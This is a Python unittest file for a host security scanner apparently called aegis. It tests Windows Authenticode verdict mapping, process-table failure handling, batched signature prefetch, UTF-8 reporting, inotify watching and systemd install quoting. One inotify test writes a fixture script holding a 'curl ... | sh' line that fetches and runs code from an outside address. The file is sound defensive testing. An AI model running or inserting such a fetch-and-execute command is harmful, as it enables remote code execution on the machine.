        # Real Get-AuthenticodeSignature answers UnknownError for a non-PE or
        # corrupt image. That status was in no branch, so trust fell through to
        # "unknown" -- which suspicious_sig() does NOT flag. A script renamed
        # .exe, or a corrupt dropper, was therefore un-suspicious on Windows
        # while macOS called the identical file unsigned. Verified against a
        # real Windows box: a text file with an .exe extension came back
        # "unknown", not "unsigned".
        saved = aegis.run
        try:
            for status in ("UnknownError", "NotSupportedFileFormat",
                           "SomeFutureStatus"):
                aegis.run = lambda *a, _s=status, **k: (_s + "\n\n", "", 0)
                got = aegis._classify_windows(r"C:\Users\x\payload.exe")
                self.assertEqual("unsigned", got["trust"],
                                 "status %r must not be trusted" % status)
                self.assertFalse(got.get("probe_failed"),
                                 "the probe answered; it did not fail")
        finally:
            aegis.run = saved

        # ...and on the Windows trust model that verdict is suspicious, which
        # is the whole point of the remapping. suspicious_sig() reads the
        # platform flags, and `unsigned` is deliberately NOT suspicious on
        # Linux (every locally built binary is unmanaged there), so assert it
        # against the Windows model rather than whichever host runs the suite.
        flags = (aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX)
        aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX = True, False, False
        try:
            self.assertTrue(aegis.suspicious_sig("unsigned"))
            self.assertFalse(aegis.suspicious_sig("unknown"),
                             "a probe with no answer must not be alerted on")
        finally:
            aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX = flags

    def test_valid_and_tampered_statuses_still_map_correctly(self):
        # Positive control: broadening the fall-through must not swallow the
        # verdicts that carry the real signal.
        saved = aegis.run
        cases = {"Valid\nCN=Microsoft Windows, O=x\n": "os-signed",
                 "Valid\nCN=Contoso Ltd, O=x\n": "signed-valid",
                 "HashMismatch\nCN=Contoso Ltd\n": "broken",
                 "NotTrusted\nCN=Contoso Ltd\n": "broken",
                 "NotSigned\n\n": "unsigned"}
        try:
            for out, expected in cases.items():
                aegis.run = lambda *a, _o=out, **k: (_o, "", 0)
                self.assertEqual(
                    expected,
                    aegis._classify_windows(r"C:\x.exe")["trust"], out)
        finally:
            aegis.run = saved

    def test_a_failed_signature_probe_is_never_cached(self):
        # Caching the failure makes the fail-open DURABLE: the binary stays
        # un-suspicious until its mtime or size changes.
        import tempfile
        tmp = tempfile.mkdtemp(prefix="aegis_sigfail_")
        target = os.path.join(tmp, "payload.exe")
        with open(target, "wb") as fh:
            fh.write(b"MZ\x00\x00")
        saved = (aegis._sigcache, aegis._classify_windows, aegis._classify_mac,
                 aegis._classify_linux)
        aegis._sigcache = {}
        failed = {"trust": "unknown", "team": None, "authority": None,
                  "probe_failed": True}
        aegis._classify_windows = lambda p: dict(failed)
        aegis._classify_mac = lambda p: dict(failed)
        aegis._classify_linux = lambda p: dict(failed)
        try:
            out = aegis.classify_signature(target)
            self.assertNotIn("probe_failed", out,
                             "the marker is internal; callers see the normal "
                             "shape")
            self.assertNotIn(target, aegis._sigcache,
                             "a failed probe must not be cached")
        finally:
            (aegis._sigcache, aegis._classify_windows, aegis._classify_mac,
             aegis._classify_linux) = saved
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    def test_a_real_verdict_is_still_cached(self):
        # Positive control: the no-cache rule must not disable caching outright.
        import tempfile
        tmp = tempfile.mkdtemp(prefix="aegis_sigok_")
        target = os.path.join(tmp, "ok.exe")
        with open(target, "wb") as fh:
            fh.write(b"MZ\x00\x00")
        saved = (aegis._sigcache, aegis._classify_windows, aegis._classify_mac,
                 aegis._classify_linux)
        aegis._sigcache = {}
        good = {"trust": "unsigned", "team": None, "authority": None}
        aegis._classify_windows = lambda p: dict(good)
        aegis._classify_mac = lambda p: dict(good)
        aegis._classify_linux = lambda p: dict(good)
        try:
            aegis.classify_signature(target)
            self.assertIn(target, aegis._sigcache)
        finally:
            (aegis._sigcache, aegis._classify_windows, aegis._classify_mac,
             aegis._classify_linux) = saved
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)


class ProcessTableNonAnswerIsNotEmptiness(unittest.TestCase):
    """The process enumeration failing must not read as 'nothing is running'.

    Same rule the repo already enforces for sfltool/BTM and the Defender
    probes, applied to the sensor the live run had just brought back from the
    dead. The harness measured 41s for 135 processes against what was then a
    60s ceiling, so this is a reachable failure, not a hypothetical one."""

    def setUp(self):
        self._saved = (aegis.run, aegis._PROC_ENUM_FAILED, aegis.IS_WIN,
                       aegis.IS_MAC, aegis.IS_LINUX,
                       aegis._PROC_ARGV_PARTIAL)
        aegis._PROC_ENUM_FAILED = False
        aegis._PROC_ARGV_PARTIAL = False

    def tearDown(self):
        (aegis.run, aegis._PROC_ENUM_FAILED, aegis.IS_WIN, aegis.IS_MAC,
         aegis.IS_LINUX, aegis._PROC_ARGV_PARTIAL) = self._saved

    def test_a_timed_out_windows_query_is_recorded_not_swallowed(self):
        aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX = True, False, False
        aegis.run = lambda *a, **k: ("", "timeout", 124)
        self.assertEqual([], list(aegis._iter_processes()))
        self.assertTrue(aegis._PROC_ENUM_FAILED,
                        "an unanswered process table must be recorded so the "
                        "scan can report DEGRADED coverage")

    def test_a_timed_out_mac_ps_is_recorded_not_swallowed(self):
        aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX = False, True, False
        aegis.run = lambda *a, **k: ("", "timeout", 124)
        self.assertEqual([], list(aegis._iter_processes()))
        self.assertTrue(aegis._PROC_ENUM_FAILED)

    def test_a_genuinely_empty_answer_is_not_a_failure(self):
        # Positive control: rc 0 with no rows is a real (if odd) answer, and
        # must NOT be reported as degraded coverage.
        aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX = True, False, False
        aegis.run = lambda *a, **k: ("1\tme\tC:\\W\\x.exe\tx.exe\n", "", 0)
        self.assertEqual(1, len(list(aegis._iter_processes())))
        self.assertFalse(aegis._PROC_ENUM_FAILED)

    def test_mac_argv_partial_answer_is_marked_degraded(self):
        """A successful executable table plus failed argv table is useful but
        incomplete: behavioral argv coverage must not be reported healthy."""
        aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX = False, True, False
        replies = iter([
            ("42  501  /bin/zsh\n", "", 0),
            ("", "permission denied", 1),
        ])
        aegis.run = lambda *a, **k: next(replies)
        rows = list(aegis._iter_processes())
        self.assertEqual([("42", "501", "/bin/zsh", "/bin/zsh")], rows)
        self.assertTrue(aegis._PROC_ARGV_PARTIAL)


class OutboundRowsBatchesPsByPid(unittest.TestCase):
    """The macOS/BSD outbound branch spawned one `ps -o comm= -p <pid>` per
    connection ROW. A process with N live outbound connections appears on N
    netstat lines, so a browser with 8 connections spawned 8 identical lookups
    (measured: 55 rows / 23 pids = 32 redundant spawns per scan). The Linux and
    Windows branches already resolve pid->name from one batched structure; this
    pins the macOS parity fix — one `ps` per unique pid, output unchanged."""

    def setUp(self):
        self._saved = (aegis.run, aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX,
                       aegis._parse_netstat_established)
        aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX = False, True, False

    def tearDown(self):
        (aegis.run, aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX,
         aegis._parse_netstat_established) = self._saved

    def test_one_ps_per_pid_not_per_row(self):
        rows = [("proc", "500", "1.1.1.1", "443"),
                ("proc", "500", "1.1.1.2", "443"),
                ("proc", "500", "1.1.1.3", "443"),
                ("proc", "600", "2.2.2.2", "80"),
                ("proc", "600", "2.2.2.3", "80")]
        aegis._parse_netstat_established = lambda text: iter(rows)
        ps_calls = []

        def fake_run(cmd, *a, **k):
            if isinstance(cmd, (list, tuple)) and cmd and cmd[0] == "ps":
                ps_calls.append(cmd[-1])          # the pid argument
                return ("browser\n", "", 0)
            return ("netstat-nonempty", "", 0)    # the NETSTAT_CMD call

        aegis.run = fake_run
        out = aegis._outbound_rows()
        # 2 unique pids -> exactly 2 ps spawns, not 5 (one per row).
        self.assertEqual(2, len(ps_calls),
                         "ps spawned %d times for 2 unique pids across 5 rows"
                         % len(ps_calls))
        # Output is unchanged: every row still resolves to its comm.
        self.assertEqual(5, len(out))
        self.assertTrue(all(r[0] == "browser" for r in out))
        self.assertEqual({"1.1.1.1", "1.1.1.2", "1.1.1.3", "2.2.2.2", "2.2.2.3"},
                         {r[1] for r in out})


class SignatureBatchPrefetch(unittest.TestCase):
    """One PowerShell start-up for many binaries instead of one apiece.

    A cold powershell.exe measured 21-29s on real Windows, so the count of
    start-ups is the whole cost of a scan's signature work."""

    def setUp(self):
        self._saved = (aegis.run, aegis._sigcache, aegis.IS_WIN, aegis.IS_MAC,
                       aegis.IS_LINUX, aegis._sig_stat)
        aegis.IS_WIN, aegis.IS_MAC, aegis.IS_LINUX = True, False, False
        aegis._sigcache = {}
        aegis._sig_stat = lambda p: "stat:" + p

    def tearDown(self):
        (aegis.run, aegis._sigcache, aegis.IS_WIN, aegis.IS_MAC,
         aegis.IS_LINUX, aegis._sig_stat) = self._saved

    def _counting_run(self, reply):
        calls = []

        def _run(cmd, timeout=15, extra_env=None):
            calls.append(extra_env or {})
            return reply(extra_env or {})
        return _run, calls

    def test_many_paths_cost_one_powershell_start_up(self):
        # Real files: classify_signature short-circuits a nonexistent path to
        # `missing` before it ever consults the cache.
        import shutil
        import tempfile
        tmp = tempfile.mkdtemp(prefix="aegis_batch_")
        try:
            paths = []
            for i in range(25):
                p = os.path.join(tmp, "p%d.exe" % i)
                with open(p, "wb") as fh:
                    fh.write(b"MZ\x00\x00")
                paths.append(p)

            def reply(env):
                return ("".join("%s\tNotSigned\t\n" % p
                                for p in env["AEGIS_SIG_PATHS"].split("\n")),
                        "", 0)
            aegis.run, calls = self._counting_run(reply)

            self.assertEqual(25, aegis.warm_signature_cache(paths))
            self.assertEqual(
                1, len(calls),
                "25 binaries must cost ONE PowerShell start-up, not 25")

            # ...and every path now answers from cache: still one call total.
            for p in paths:
                self.assertEqual("unsigned",
                                 aegis.classify_signature(p)["trust"])
            self.assertEqual(1, len(calls),
                             "classify_signature must hit the warmed cache")
        finally:
            shutil.rmtree(tmp, ignore_errors=True)

    def test_the_batch_agrees_with_the_single_path_probe(self):
        # Both must route through _win_verdict; a divergence here would mean
        # the fast path and the careful path disagree about what a status means.
        for status, signer, expected in (
                ("Valid", "CN=Microsoft Windows, O=x", "os-signed"),
                ("Valid", "CN=Contoso Ltd, O=x", "signed-valid"),
                ("HashMismatch", "CN=Contoso Ltd", "broken"),
                ("NotTrusted", "CN=Contoso Ltd", "broken"),
                ("NotSigned", "", "unsigned"),
                ("UnknownError", "", "unsigned")):
            aegis._sigcache = {}
            path = "C:\\Users\\a\\one.exe"
            aegis.run = lambda *a, _s=status, _g=signer, **k: (
                "%s\t%s\t%s\n" % (path, _s, _g), "", 0)
            aegis.warm_signature_cache([path])
            batched = aegis._sigcache[path]["result"]

            aegis.run = lambda *a, _s=status, _g=signer, **k: (
                "%s\n%s\n" % (_s, _g), "", 0)
            single = aegis._classify_windows(path)
            self.assertEqual(single, batched,
                             "batch and single-path verdicts diverged for %r"
                             % status)
            self.assertEqual(expected, batched["trust"])

    def test_a_failed_batch_changes_no_verdict(self):
        # The prefetch is an optimization. If PowerShell refuses, nothing may
        # be cached and nothing may be decided -- the per-path probe still runs.
        aegis.run = lambda *a, **k: ("", "blocked", 1)
        self.assertEqual(0, aegis.warm_signature_cache(["C:\\a\\x.exe"]))
        self.assertEqual({}, aegis._sigcache,
                         "a failed prefetch must invent no verdicts")

    def test_a_path_the_batch_skipped_is_never_cached(self):
        # A row with no status is a non-answer; caching it would be the
        # fail-open the single-path probe is careful to avoid.
        aegis.run = lambda *a, **k: ("C:\\a\\x.exe\t\t\n", "", 0)
        self.assertEqual(0, aegis.warm_signature_cache(["C:\\a\\x.exe"]))
        self.assertEqual({}, aegis._sigcache)

    def test_already_cached_paths_are_not_re_probed(self):
        aegis._sigcache = {"C:\\a\\x.exe": {"stat": "stat:C:\\a\\x.exe",
                                            "result": {"trust": "os-signed"}}}
        aegis.run, calls = self._counting_run(lambda env: ("", "", 0))
        self.assertEqual(0, aegis.warm_signature_cache(["C:\\a\\x.exe"]))
        self.assertEqual([], calls, "a warm cache must cost no subprocess")

    def test_the_windows_persistence_snapshot_batches_its_classifications(self):
        # The snapshot classifies every autostart entry's program. One
        # PowerShell start-up apiece is the whole cost of a first scan, so the
        # snapshot must resolve them as a set, not one at a time.
        import shutil
        import sys as _sys
        import tempfile
        tmp = tempfile.mkdtemp(prefix="aegis_persbatch_")
        saved = (aegis.PERSISTENCE_DIRS, aegis._WIN_RUN_KEYS,
                 aegis.TRUSTED_PREFIXES, aegis.RISKY_PREFIXES, aegis.sha256)
        # Same injection the live-plumbing class uses; an empty tree makes every
        # hive lookup miss, leaving the startup folder as the only source.
        prior_winreg = _sys.modules.get("winreg")
        _sys.modules["winreg"] = _FakeWinreg({})
        try:
            progs = []
            for i in range(6):
                p = os.path.join(tmp, "boot%d.exe" % i)
                with open(p, "wb") as fh:
                    fh.write(b"MZ\x00\x00")
                progs.append(p)
            aegis.PERSISTENCE_DIRS = [tmp]
            aegis._WIN_RUN_KEYS = []       # registry is unreachable in-process
            aegis.RISKY_PREFIXES = (tmp,)
            aegis.TRUSTED_PREFIXES = ("C:\\Windows\\",)
            aegis.sha256 = lambda p: "deadbeef"

            batched, singles = [], []

            def _run(cmd, timeout=15, extra_env=None):
                env = extra_env or {}
                if "AEGIS_SIG_PATHS" in env:
                    paths = env["AEGIS_SIG_PATHS"].split("\n")
                    batched.append(len(paths))
                    return ("".join("%s\tNotSigned\t\n" % q for q in paths),
                            "", 0)
                if "AEGIS_SIG_PATH" in env:
                    singles.append(env["AEGIS_SIG_PATH"])
                    return ("NotSigned\n\n", "", 0)
                return ("", "", 1)     # schtasks etc. -- nothing to enumerate
            aegis.run = _run

            snap = aegis._snapshot_persistence_windows()
            self.assertEqual(6, len(snap), snap)
            self.assertEqual([6], batched,
                             "six startup entries must resolve in ONE batch")
            self.assertEqual([], singles,
                             "nothing should fall back to a per-path probe "
                             "once the batch has answered")
        finally:
            (aegis.PERSISTENCE_DIRS, aegis._WIN_RUN_KEYS,
             aegis.TRUSTED_PREFIXES, aegis.RISKY_PREFIXES,
             aegis.sha256) = saved
            if prior_winreg is None:
                _sys.modules.pop("winreg", None)
            else:
                _sys.modules["winreg"] = prior_winreg
            shutil.rmtree(tmp, ignore_errors=True)

    def test_hot_dir_prefetch_batches_its_executables(self):
        import shutil
        import tempfile
        tmp = tempfile.mkdtemp(prefix="aegis_hotbatch_")
        saved = aegis.HOT_DIRS
        try:
            for i in range(4):
                with open(os.path.join(tmp, "drop%d.exe" % i), "wb") as fh:
                    fh.write(b"MZ\x90\x00" + b"\x00" * 64)
            # A non-executable must not consume a slot.
            with open(os.path.join(tmp, "notes.txt"), "w") as fh:
                fh.write("hello")
            aegis.HOT_DIRS = [tmp]

            seen = []

            def _run(cmd, timeout=15, extra_env=None):
                env = extra_env or {}
                paths = env.get("AEGIS_SIG_PATHS", "").split("\n")
                seen.append(len(paths))
                return ("".join("%s\tNotSigned\t\n" % q for q in paths), "", 0)
            aegis.run = _run

            aegis._warm_hot_dir_signatures(0)
            self.assertEqual([4], seen,
                             "four dropped PEs in one batch, text file excluded")
        finally:
            aegis.HOT_DIRS = saved
            shutil.rmtree(tmp, ignore_errors=True)

    def test_a_large_batch_is_chunked_inside_the_environment_limit(self):
        # Windows caps a process environment block at 32767 chars and the paths
        # ride in an env var, so an unbounded batch eventually fails outright.
        paths = [r"C:\Users\c\AppData\Local\Programs\vendor%03d\tool%03d.exe"
                 % (i, i) for i in range(300)]
        sizes = []

        def _run(cmd, timeout=15, extra_env=None):
            blob = (extra_env or {})["AEGIS_SIG_PATHS"]
            sizes.append(len(blob))
            return ("".join("%s\tNotSigned\t\n" % q for q in blob.split("\n")),
                    "", 0)
        aegis.run = _run

        self.assertEqual(300, aegis.warm_signature_cache(paths),
                         "chunking must not lose any path")
        self.assertGreater(len(sizes), 1, "300 paths must be chunked")
        self.assertLess(max(sizes), 32767 // 2,
                        "every chunk must stay well inside the env limit")

    def test_one_bad_chunk_does_not_lose_the_others(self):
        # A single wedging path (a file on a dead network mount) used to cost
        # the entire batch, which then fell back to per-path probes -- strictly
        # worse than never batching. Now it costs only its own chunk.
        paths = ["C:\\p%03d.exe" % i for i in range(200)]
        seen = []

        def _run(cmd, timeout=15, extra_env=None):
            blob = (extra_env or {})["AEGIS_SIG_PATHS"]
            seen.append(len(blob.split("\n")))
            if len(seen) == 1:
                return ("", "timeout", 124)      # first chunk wedges
            return ("".join("%s\tNotSigned\t\n" % q for q in blob.split("\n")),
                    "", 0)
        aegis.run = _run

        resolved = aegis.warm_signature_cache(paths)
        self.assertGreater(len(seen), 1)
        self.assertEqual(200 - seen[0], resolved,
                         "only the wedged chunk is lost")
        self.assertGreater(resolved, 0,
                           "a single bad path must not sink the whole prefetch")

    def test_batch_timeout_scales_with_the_chunk(self):
        # A flat ceiling means a timeout burns the full budget before falling
        # back; the cost should be proportional to what was actually asked for.
        seen = []

        def _run(cmd, timeout=15, extra_env=None):
            seen.append((len((extra_env or {})["AEGIS_SIG_PATHS"].split("\n")),
                         timeout))
            return ("", "", 1)
        aegis.run = _run
        aegis.warm_signature_cache(["C:\\a.exe", "C:\\b.exe"])
        count, timeout = seen[0]
        self.assertEqual(2, count)
        self.assertLess(timeout, 120,
                        "two paths must not reserve a multi-minute ceiling")

    def test_prefetch_is_a_no_op_off_windows(self):
        aegis.IS_WIN, aegis.IS_LINUX = False, True
        aegis.run, calls = self._counting_run(lambda env: ("", "", 0))
        self.assertEqual(0, aegis.warm_signature_cache(["/usr/bin/x"]))
        self.assertEqual([], calls)


class TextEncodingIsPinned(unittest.TestCase):
    _SOURCE = os.path.join(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__))), "aegis.py")

    def test_no_text_mode_open_relies_on_the_locale_codec(self):
        import re
        offenders = []
        with open(self._SOURCE, encoding="utf-8") as f:
            for lineno, line in enumerate(f, 1):
                # \b never matches inside Popen/urlopen; os.open is a raw fd and
                # takes no encoding, so it is excluded by name.
                if not re.search(r"\b(?:os\.fdopen|io\.open|open)\(", line):
                    continue
                if re.search(r'"[rwax]b\+?"|\bos\.open\(|encoding=', line):
                    continue
                offenders.append("%d: %s" % (lineno, line.strip()))
        self.assertEqual(offenders, [],
                         "text-mode open() without encoding= falls back to the "
                         "locale codec (cp1252 on Windows) and will crash or "
                         "silently mangle non-ASCII:\n" + "\n".join(offenders))

    def test_report_round_trips_non_ascii_as_utf8(self):
        import tempfile
        tmp = tempfile.mkdtemp(prefix="aegis_enc_")
        saved = (aegis.STATE_DIR, aegis.LATEST_MD, aegis.LATEST_JSON)
        aegis.STATE_DIR = tmp
        aegis.LATEST_MD = os.path.join(tmp, "latest.md")
        aegis.LATEST_JSON = os.path.join(tmp, "latest.json")
        try:
            f = aegis.finding("MEDIUM", "hot-dir", "Unsigned binary dropped",
                              "C:\\Users\\Bj\u00f6rn\\Downloads\\caf\u00e9.exe",
                              "hot:enc:1")
            md = aegis.write_report([f], first_run=False)
            with open(aegis.LATEST_MD, encoding="utf-8") as fh:
                self.assertEqual(fh.read(), md)
            # The brief report leads with a verdict rather than enumerating
            # every finding, so the per-severity icon now lives in the full
            # render. Both layers are asserted: each carries a byte sequence
            # cp1252 cannot represent, and each must reach its file intact.
            self.assertTrue(any(ord(c) > 0x7F for c in md),
                            "brief report lost all non-ASCII")
            full = aegis._full_report(aegis.load_json(aegis.LATEST_JSON, {}))
            self.assertIn(aegis.SEV_ICON["MEDIUM"], full)
            # the operator's own non-ASCII text must survive the round trip too
            self.assertIn("caf\u00e9.exe", full)
        finally:
            (aegis.STATE_DIR, aegis.LATEST_MD, aegis.LATEST_JSON) = saved
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    def test_run_never_raises_on_undecodable_tool_output(self):
        # A tool that emits a byte the locale codec cannot decode must degrade
        # to a replacement character, not blow up the surface that called it.
        if aegis.IS_WIN:
            cmd = ["cmd", "/c", "echo", "ok"]
        else:
            cmd = ["/bin/sh", "-c", r"printf 'a\377b'"]
        out, err, rc = aegis.run(cmd, timeout=10)
        self.assertEqual(rc, 0, "run() failed outright: %r / %r" % (out, err))
        self.assertTrue(out.strip(), "run() returned no output: %r" % (err,))


class TestInotifyLive(unittest.TestCase):
    """Real inotify, against a real Linux kernel: a real fd, a real write, a
    real wake.

    This SKIPS everywhere it cannot do that, and never passes instead. The
    distinction is the whole point of the file it lives in — two Windows
    sensors stayed broken for a release because their tests asserted against
    fixtures built from the code's own wrong assumptions. A green result for
    kernel-interface code on a kernel that has no such interface is that same
    false assurance, so this asks the kernel or admits it could not."""

    def setUp(self):
        if not aegis.IS_LINUX:
            self.skipTest("inotify is Linux-only; macOS uses kqueue and "
                          "Windows polls")
        if aegis._inotify_libc() is None:
            self.skipTest("libc exposes no inotify entry points here")

    def test_a_real_write_wakes_a_real_inotify_fd(self):
        import shutil
        import tempfile
        d = tempfile.mkdtemp(prefix="aegis_ino_")
        real = aegis._watch_paths
        aegis._watch_paths = lambda: [d]
        try:
            fd, watched = aegis._build_watch_inotify()
            self.assertIsNotNone(fd, "inotify could not be armed at all")
            self.assertEqual(1, watched)
            try:
                # Pole 1: nothing has happened, so the fd must stay quiet.
                # Without this a function hardwired to return True passes.
                self.assertFalse(
                    aegis._wait_for_change_inotify(fd, 0.2),
                    "inotify reported a change before anything was written")
                # Pole 2: a real drop into a watched directory wakes it.
                with open(os.path.join(d, "dropped.sh"), "w") as f:
                    f.write("#!/bin/sh\ncurl http://198.51.100.7/x | sh\n")
                self.assertTrue(
                    aegis._wait_for_change_inotify(fd, 5.0),
                    "a real file creation did not wake inotify; the Linux "
                    "watch would be an interval timer wearing an "
                    "event-driven label")
                # Pole 3: the fd was drained. inotify is level-triggered, so
                # an undrained event makes every later select() return
                # instantly and spins the watch loop at 100% CPU.
                self.assertFalse(
                    aegis._wait_for_change_inotify(fd, 0.2),
                    "the fd was not drained, so the watch loop would spin")
            finally:
                os.close(fd)
        finally:
            aegis._watch_paths = real
            shutil.rmtree(d, ignore_errors=True)

    def test_arming_nothing_fails_over_to_polling(self):
        """An empty watch set must report (None, 0) rather than hand back an
        fd that can never wake — which would silently convert the watch into
        an interval-only timer while still calling itself event-driven."""
        real = aegis._watch_paths
        aegis._watch_paths = lambda: []
        try:
            self.assertEqual((None, 0), aegis._build_watch_inotify())
        finally:
            aegis._watch_paths = real


class TestInotifyAbsentElsewhere(unittest.TestCase):

    def test_inotify_is_absent_not_broken_off_linux(self):
        """On macOS/Windows the binding must report absence cleanly so
        cmd_watch falls back to its existing path. A raised exception here
        would take the whole watch loop down on those platforms."""
        if aegis.IS_LINUX:
            self.skipTest("Linux has inotify; this pins the fallback")
        self.assertIsNone(aegis._inotify_libc())
        self.assertEqual((None, 0), aegis._build_watch_inotify())


@unittest.skipIf(getattr(aegis, "IS_WIN", False),
                 "exercises the Linux systemd install path, which calls the "
                 "POSIX-only os.getuid(); _install_linux is never invoked on "
                 "Windows in production (cmd_install dispatches by platform)")
class LinuxInstallQuotingAndIdempotency(unittest.TestCase):
    """R3-2 + R3-3. _install_linux is called directly (it does not gate on
    IS_LINUX), with systemctl/loginctl stubbed, so this runs on any POSIX host
    (macOS/Linux). Skipped on Windows: os.getuid() does not exist there."""

    def _run_install(self, mode):
        calls = []
        home = tempfile.mkdtemp(prefix="aegis home ")   # a SPACE in $HOME
        saved = (aegis.run, aegis.HOME)
        aegis.HOME = home

        def fake_run(cmd, *a, **k):
            calls.append(list(cmd))
            return ("Linger=yes", "", 0)

        aegis.run = fake_run
        try:
            runtime = os.path.join(home, ".aegis", "aegis.py")
            aegis._install_linux(runtime, mode, 600)
            with open(os.path.join(home, ".config", "systemd", "user",
                                   "aegis.service")) as _fh:
                svc = _fh.read()
        finally:
            aegis.run, aegis.HOME = saved
            shutil.rmtree(home, ignore_errors=True)
        exec_line = [l for l in svc.splitlines()
                     if l.startswith("ExecStart=")][0]
        return calls, runtime, exec_line

    def test_execstart_quotes_paths_with_spaces(self):
        # R3-2: an unquoted ExecStart split on the space in $HOME and systemd
        # then failed the unit on every trigger; Aegis never ran.
        _calls, runtime, exec_line = self._run_install("watch")
        self.assertIn('"%s"' % runtime, exec_line,
                      "runtime path is not a single quoted argument: %s"
                      % exec_line)

    def test_install_disables_both_units_before_enabling_target(self):
        # R3-3: idempotent switch + refresh — a still-running `simple` service
        # kept executing the OLD ~/.aegis copy, and switching modes left the
        # previous unit running. Both are stopped+disabled before the target is
        # enabled.
        calls, _runtime, _exec = self._run_install("watch")
        disabled = {c[4] for c in calls
                    if c[:4] == ["systemctl", "--user", "disable", "--now"]}
        self.assertEqual({"aegis.service", "aegis.timer"}, disabled)
        enable_idx = next(i for i, c in enumerate(calls) if "enable" in c)
        disable_idxs = [i for i, c in enumerate(calls) if "disable" in c]
        self.assertTrue(all(di < enable_idx for di in disable_idxs),
                        "disable must precede enable")


class ScanDirsHaveNoRealpathAliases(unittest.TestCase):
    """R3-5. macOS's /tmp is a firmlink to /private/tmp; listing both scanned
    every physical file twice and emitted two findings for one object."""

    def test_no_scan_dir_list_has_a_realpath_duplicate(self):
        for name in ("HOT_DIRS", "STAGING_DIRS"):
            lst = getattr(aegis, name)
            rps = [os.path.realpath(d) for d in lst]
            self.assertEqual(len(rps), len(set(rps)),
                             "%s lists the same physical dir twice: %s"
                             % (name, lst))

    def test_dedup_collapses_a_real_alias(self):
        # Platform-agnostic: a symlink is the same aliasing the /tmp firmlink is.
        d = tempfile.mkdtemp()
        try:
            real = os.path.join(d, "real")
            os.makedirs(real)
            link = os.path.join(d, "link")
            os.symlink(real, link)
            self.assertEqual([real], aegis._dedup_by_realpath([real, link]))
            self.assertEqual([link], aegis._dedup_by_realpath([link, real]))
        finally:
            shutil.rmtree(d, ignore_errors=True)


if __name__ == "__main__":
    unittest.main()
